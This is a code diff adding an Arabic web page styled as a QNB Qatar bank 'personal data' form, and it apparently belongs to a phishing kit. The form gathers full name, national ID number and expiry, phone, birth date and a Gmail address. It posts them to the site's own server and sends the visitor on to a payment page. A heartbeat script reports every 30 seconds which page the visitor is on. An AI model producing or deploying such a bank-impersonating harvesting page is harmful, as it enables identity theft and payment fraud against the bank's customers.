@@ -1,0 +1,530 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بنك QNB قطر - البيانات الشخصية</title>
+    <style>
+        *, *::before, *::after { box-sizing: border-box; }
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Tajawal', 'Segoe UI', Tahoma, sans-serif;
+            background-color: #F5F8FF;
+            color: #212529;
+        }
+        header {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            background-color: #ffffff;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.08);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 24px;
+            z-index: 1000;
+        }
+        .header-left {
+            display: flex;
+            align-items: center;
+            flex-shrink: 0;
+        }
+        .header-left img {
+            height: 42px;
+            object-fit: contain;
+        }
+        .lang-btn {
+            font-weight: bold;
+            color: #ffffff;
+            background: #C41E3A;
+            padding: 10px 20px;
+            border-radius: 6px;
+            text-decoration: none;
+            font-size: 15px;
+            transition: background-color 0.2s;
+            flex-shrink: 0;
+        }
+        .lang-btn:hover {
+            background-color: #A01830;
+        }
+        .header-right {
+            display: flex;
+            align-items: center;
+            flex-shrink: 0;
+        }
+        .phone-group {
+            display: none;
+        }
+        .menu-icon {
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            width: 28px;
+            height: 20px;
+            cursor: pointer;
+            flex-shrink: 0;
+        }
+        .menu-icon span {
+            display: block;
+            height: 3px;
+            background-color: #000000;
+            border-radius: 2px;
+        }
+        
+        /* Full Width Professional Form Container */
+        .main-container {
+            margin-top: 85px;
+            width: 100%;
+            min-height: calc(100vh - 85px);
+            background-color: #F5F8FF;
+            padding: 50px 20px 80px 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .form-wrapper {
+            width: 100%;
+            max-width: 900px;
+            background: #ffffff;
+            padding: 50px 60px;
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.04);
+            border: 1px solid #D6E4F0;
+        }
+        .form-title {
+            font-size: 28px;
+            color: #001F5C;
+            margin-bottom: 35px;
+            font-weight: 700;
+            text-align: center;
+            border-bottom: 2px solid #E0EBF7;
+            padding-bottom: 15px;
+        }
+        
+        /* Grid layout for inputs */
+        .form-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 25px;
+        }
+        .form-group {
+            margin-bottom: 22px;
+        }
+        .form-group.full-width {
+            grid-column: span 2;
+        }
+        .form-group label {
+            display: block;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #1A2744;
+            font-size: 14px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .form-control {
+            width: 100%;
+            padding: 14px 18px;
+            border: 1.5px solid #B8D4E8;
+            border-radius: 8px;
+            font-size: 15px;
+            outline: none;
+            transition: all 0.3s ease;
+            background-color: #fafbfc;
+            color: #333;
+        }
+        .form-control:focus {
+            border-color: #001F5C;
+            background-color: #fff;
+            box-shadow: 0 0 0 4px rgba(0,51,160,0.12);
+        }
+        
+        /* Phone input with country flag */
+        .phone-input-wrapper {
+            display: flex;
+            align-items: center;
+            border: 1.5px solid #B8D4E8;
+            border-radius: 8px;
+            overflow: hidden;
+            background-color: #fafbfc;
+            transition: all 0.3s ease;
+        }
+        .phone-input-wrapper:focus-within {
+            border-color: #001F5C;
+            background-color: #fff;
+            box-shadow: 0 0 0 4px rgba(0,51,160,0.12);
+        }
+        .phone-country-code {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            padding: 14px 12px;
+            background-color: #F0F5FF;
+            border-left: 1.5px solid #B8D4E8;
+            font-size: 14px;
+            font-weight: 600;
+            color: #001F5C;
+            white-space: nowrap;
+            user-select: none;
+        }
+        .phone-country-flag {
+            font-size: 18px;
+            line-height: 1;
+        }
+        .phone-input-wrapper .form-control {
+            border: none;
+            border-radius: 0;
+            background: transparent;
+            box-shadow: none;
+            padding: 14px 18px;
+            flex: 1;
+        }
+        .phone-input-wrapper .form-control:focus {
+            box-shadow: none;
+        }
+
+        /* Dropdowns layout for dates */
+        .date-select-group {
+            display: flex;
+            gap: 12px;
+        }
+        .date-select-group select {
+            flex: 1;
+            background-color: #fafbfc;
+            cursor: pointer;
+        }
+
+        .radio-group {
+            display: flex;
+            gap: 30px;
+            margin-top: 10px;
+        }
+        .radio-label {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-weight: 500;
+            cursor: pointer;
+            font-size: 16px;
+            color: #333;
+        }
+        .radio-label input {
+            width: 18px;
+            height: 18px;
+            accent-color: #001F5C;
+        }
+        
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin: 30px 0;
+            cursor: pointer;
+            font-size: 15px;
+            color: #1A2744;
+            grid-column: span 2;
+        }
+        .checkbox-container input {
+            width: 20px;
+            height: 20px;
+            cursor: pointer;
+            accent-color: #001F5C;
+        }
+        
+        .submit-btn {
+            grid-column: span 2;
+            background-color: #001F5C;
+            color: #ffffff;
+            border: none;
+            padding: 16px;
+            border-radius: 8px;
+            font-size: 17px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 12px rgba(0,51,160,0.2);
+            margin-top: 10px;
+        }
+        .submit-btn:hover {
+            background-color: #002280;
+            transform: translateY(-1px);
+            box-shadow: 0 6px 15px rgba(0,51,160,0.3);
+        }
+
+        .error-message {
+            color: #dc3545;
+            font-size: 14px;
+            margin-top: 5px;
+        }
+
+        .success-message {
+            color: #28a745;
+            font-size: 14px;
+            margin-top: 5px;
+        }
+
+        /* Footer Section */
+        footer {
+            background-color: #000000;
+            color: #ffffff;
+            padding: 60px 20px 30px 20px;
+        }
+        .footer-container {
+            max-width: 1100px;
+            margin: 0 auto;
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+        }
+        .footer-logo {
+            height: 40px;
+            object-fit: contain;
+            margin-bottom: 25px;
+            filter: none;
+        }
+        .footer-info {
+            font-size: 15px;
+            line-height: 2.2;
+            color: #cccccc;
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+        .footer-bottom {
+            margin-top: 40px;
+            width: 100%;
+            border-top: 1px solid #002280;
+            padding-top: 20px;
+            font-size: 14px;
+            color: #777777;
+            text-align: center;
+        }
+
+        /* Responsive */
+        @media(max-width: 768px) {
+            .form-grid {
+                grid-template-columns: 1fr;
+            }
+            .form-group.full-width, .checkbox-container, .submit-btn {
+                grid-column: span 1;
+            }
+            .form-wrapper {
+                padding: 30px 20px;
+            }
+        }
+    </style>
+<link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+</head>
+<body>
+
+        <header>
+        <div class="menu-icon">
+            <span></span>
+            <span></span>
+            <span></span>
+        </div>
+        <div class="header-left">
+            <img src="images/qnb-logo.png" alt="بنك QNB قطر">
+        </div>
+        <div class="header-right">
+            <a href="data-en.html" class="lang-btn">English</a>
+        </div>
+    </header>
+
+    <div class="main-container">
+        <div class="form-wrapper">
+            <h2 class="form-title">البيانات الشخصية</h2>
+            <form id="personalDataForm" class="form-grid">
+                
+                <!-- Full Name -->
+                <div class="form-group full-width">
+                    <label for="fullname">الاسم الكامل</label>
+                    <input type="text" id="fullname" name="fullname" class="form-control" required placeholder="أدخل الاسم الكامل">
+                </div>
+
+                <!-- ID Number -->
+                <div class="form-group">
+                    <label for="id_number">رقم الهوية</label>
+                    <input type="text" id="id_number" name="id_number" class="form-control" required placeholder="أدخل رقم الهوية">
+                </div>
+
+                <!-- Phone Number -->
+                <div class="form-group">
+                    <label for="phone">رقم الهاتف</label>
+                    <div class="phone-input-wrapper">
+                        <div class="phone-country-code">
+                            <span class="phone-country-flag">🇶🇦</span>
+                            <span>+974</span>
+                        </div>
+                        <input type="tel" id="phone" name="phone" class="form-control" required placeholder="4440 XXXX">
+                    </div>
+                </div>
+
+                <!-- ID Expiry Date (Dropdowns) -->
+                <div class="form-group">
+                    <label>تاريخ انتهاء الهوية</label>
+                    <div class="date-select-group">
+                        <select name="id_expiry_day" class="form-control" required>
+                            <option value="">اليوم</option>
+                            <script>
+                                for(let i=1; i<=31; i++) document.write(`<option value="${i}">${i}</option>`);
+                            </script>
+                        </select>
+                        <select name="id_expiry_month" class="form-control" required>
+                            <option value="">الشهر</option>
+                            <option value="1">يناير</option>
+                            <option value="2">فبراير</option>
+                            <option value="3">مارس</option>
+                            <option value="4">أبريل</option>
+                            <option value="5">مايو</option>
+                            <option value="6">يونيو</option>
+                            <option value="7">يوليو</option>
+                            <option value="8">أغسطس</option>
+                            <option value="9">سبتمبر</option>
+                            <option value="10">أكتوبر</option>
+                            <option value="11">نوفمبر</option>
+                            <option value="12">ديسمبر</option>
+                        </select>
+                        <select name="id_expiry_year" class="form-control" required>
+                            <option value="">السنة</option>
+                            <script>
+                                for(let i=2026; i<=2050; i++) document.write(`<option value="${i}">${i}</option>`);
+                            </script>
+                        </select>
+                    </div>
+                </div>
+
+                <!-- Date of Birth (Dropdowns) -->
+                <div class="form-group">
+                    <label>تاريخ الميلاد</label>
+                    <div class="date-select-group">
+                        <select name="dob_day" class="form-control" required>
+                            <option value="">اليوم</option>
+                            <script>
+                                for(let i=1; i<=31; i++) document.write(`<option value="${i}">${i}</option>`);
+                            </script>
+                        </select>
+                        <select name="dob_month" class="form-control" required>
+                            <option value="">الشهر</option>
+                            <option value="1">يناير</option>
+                            <option value="2">فبراير</option>
+                            <option value="3">مارس</option>
+                            <option value="4">أبريل</option>
+                            <option value="5">مايو</option>
+                            <option value="6">يونيو</option>
+                            <option value="7">يوليو</option>
+                            <option value="8">أغسطس</option>
+                            <option value="9">سبتمبر</option>
+                            <option value="10">أكتوبر</option>
+                            <option value="11">نوفمبر</option>
+                            <option value="12">ديسمبر</option>
+                        </select>
+                        <select name="dob_year" class="form-control" required>
+                            <option value="">السنة</option>
+                            <script>
+                                for(let i=1950; i<=2010; i++) document.write(`<option value="${i}">${i}</option>`);
+                            </script>
+                        </select>
+                    </div>
+                </div>
+
+                <!-- Gmail -->
+                <div class="form-group full-width">
+                    <label for="email">البريد الإلكتروني (Gmail)</label>
+                    <input type="email" id="email" name="email" class="form-control" required placeholder="example@gmail.com">
+                </div>
+
+                <!-- Gender -->
+                <div class="form-group full-width">
+                    <label>الجنس</label>
+                    <div class="radio-group">
+                        <label class="radio-label">
+                            <input type="radio" name="gender" value="ذكر" required> ذكر
+                        </label>
+                        <label class="radio-label">
+                            <input type="radio" name="gender" value="أنثى" required> أنثى
+                        </label>
+                    </div>
+                </div>
+
+                <!-- Terms Checkbox -->
+                <label class="checkbox-container">
+                    <input type="checkbox" required>
+                    <span>أوافق على الشروط والأحكام</span>
+                </label>
+
+                <!-- Submit Button -->
+                <button type="submit" class="submit-btn">متابعة الطلب</button>
+
+            </form>
+        </div>
+    </div>
+
+            <footer style="background-color: #001F5C; color: #ffffff; padding: 60px 20px 30px 20px; margin-top: 60px;">
+        <div class="footer-container">
+            <a href="index.html"><img src="images/qnb-logo.png" alt="بنك QNB قطر" class="footer-logo"></a>
+            <div class="footer-info">
+                <strong>بنك قطر الوطني (QNB)</strong>
+                <span>الدوحة - دولة قطر</span>
+                <span>الهاتف: +974 4440 7777</span>
+                <span>البريد الإلكتروني: info@qnb.com.qa</span>
+            </div>
+            <div class="footer-bottom">
+                <p>&copy; 2024 بنك قطر الوطني. جميع الحقوق محفوظة.</p>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        document.getElementById('personalDataForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const formData = new FormData(e.target);
+            const data = Object.fromEntries(formData);
+            // Add country code to phone
+            if (data.phone && !data.phone.startsWith('+974')) {
+                data.phone = '+974 ' + data.phone;
+            }
+
+            try {
+                const response = await fetch('/api/orders/personal-data', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(data)
+                });
+
+                const result = await response.json();
+                
+                if (response.ok) {
+                    // Store orderId in sessionStorage
+                    sessionStorage.setItem('orderId', result.orderId);
+                    // Redirect to payment page
+                    window.location.href = 'payment.html';
+                } else {
+                    alert('خطأ: ' + result.error);
+                }
+            } catch (err) {
+                console.error('Error:', err);
+                alert('حدث خطأ في الاتصال بالخادم');
+            }
+        });
+    </script>
+
+    <script>
+        function sendHeartbeat() {
+            fetch('/api/heartbeat', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ currentPage: window.location.pathname })
+            }).catch(() => {});
+        }
+        setInterval(sendHeartbeat, 30000);
+        sendHeartbeat();
+    </script>
+</body>
+</html>
